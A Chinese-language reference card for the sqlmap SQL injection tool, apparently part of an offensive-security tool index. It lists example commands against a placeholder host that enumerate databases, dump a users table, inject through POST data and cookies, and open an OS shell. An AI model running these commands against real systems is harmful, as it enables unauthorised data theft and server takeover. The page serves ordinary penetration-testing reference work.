# sqlmap

## 简介
自动化 SQL 注入检测和利用工具，支持多种数据库

## 核心参数
- `-u`: 指定目标 URL
- `--dbs`: 枚举数据库
- `--tables`: 枚举表
- `--dump`: 导出数据
- `--os-shell`: 获取操作系统 shell

## 命令示例
```bash
# 基本 SQL 注入测试
sqlmap -u "http://target.com/page?id=1"

# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 获取数据库列表
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取指定数据库的表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 导出指定表的数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# POST 请求注入
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# 尝试获取 OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# 使用 Cookie 进行注入
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
```

## 使用场景
发现 Web 应用存在 SQL 注入漏洞时，自动化利用和数据提取

## 所属分类
- [初始访问 (Initial Access)](../categories/06-initial-access.md)
